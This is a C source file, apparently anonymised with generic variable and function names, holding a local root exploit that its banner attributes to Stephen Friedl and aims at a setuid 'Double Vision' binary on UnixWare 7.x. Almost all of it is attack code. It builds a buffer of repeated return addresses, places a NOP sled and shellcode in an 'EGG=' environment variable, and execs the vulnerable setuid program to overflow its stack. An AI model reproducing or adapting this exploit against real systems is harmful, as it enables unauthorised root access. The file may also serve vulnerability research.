
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int retlen ;
typedef int retbuf ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 char** VAR_3 ;
 int FUNC_0 (int ) ;
 char** VAR_4 ;
 int FUNC_1 (char*,char**,char**) ;
 char* VAR_5 ;
 int FUNC_2 (int) ;
 int FUNC_3 (int,char**,char*) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*,int ,int) ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_6 (char*,...) ;
 char* VAR_8 ;
 int FUNC_7 (int ,char*) ;
 int VAR_9 ;
 int FUNC_8 (char**,char*) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (int ,int ,int) ;

int FUNC_11(int VAR_10, char *VAR_11[])
{
int VAR_12;
int VAR_13;
char VAR_14[1024];
int VAR_15 = sizeof VAR_14 - 1;
int VAR_16 = 2048;
char VAR_17[5000];
int VAR_18 = 0;
char *VAR_19;

        FUNC_7(VAR_9, (char *)0 );

        while ( (VAR_12 = FUNC_3(VAR_10, VAR_11, "a:r:l:")) != VAR_0 )
        {
                switch (VAR_12)
                {
                  case 'a': VAR_2 = FUNC_10(VAR_6, 0, 16); break;
                  case 'l': VAR_18 = FUNC_0(VAR_6); break;
                  case 'r': VAR_16 = FUNC_0(VAR_6); break;
                }
        }

        if ( VAR_7 < VAR_10 )
                VAR_5 = VAR_11[VAR_7++];

        FUNC_6("UnixWare 7.x exploit for suid root Double Vision\n");
        FUNC_6("Stephen Friedl <steve@unixwiz.net>\n");
        FUNC_6("Using addr=0x%x   retlen=%d\n", VAR_2, VAR_16);





        if ( VAR_16 > sizeof(VAR_17) )
        {
                FUNC_6("ERROR: retlen can't be > %d\n", sizeof(VAR_16));
                FUNC_2(1);
        }

        VAR_19 = (char *)&VAR_2;

        if ( !VAR_19[0] || !VAR_19[1] || !VAR_19[2] || !VAR_19[3] )
        {
                FUNC_6("ERROR: ret address 0x%08lx has a zero byte!\n", VAR_2);
                FUNC_2(1);
        }
        FUNC_8(&VAR_17, "XXXX");

        for (VAR_13 = VAR_18; VAR_13 < VAR_16 - 4; VAR_13 += 4)
        {
                FUNC_4(VAR_17+VAR_13, &VAR_2, 4);
        }
        VAR_17[VAR_13] = 0;

        FUNC_6("strlen(retbuf) = %d\n", FUNC_9( (char *)VAR_17) );
        FUNC_5(VAR_14, VAR_1, VAR_15);
        FUNC_4(VAR_14, "EGG=", 4);


        FUNC_4(VAR_14 + (VAR_15 - FUNC_9(VAR_8)- 1), VAR_8, FUNC_9(VAR_8));

        VAR_14[VAR_15] = '\0';



        VAR_3[0] = VAR_5;
        VAR_3[1] = "dvexploit";
        VAR_3[2] = (char *)VAR_17;
        VAR_3[3] = 0;





        VAR_4[0] = VAR_14;
        VAR_4[1] = 0;

        FUNC_1(VAR_3[0], VAR_3, VAR_4);
}
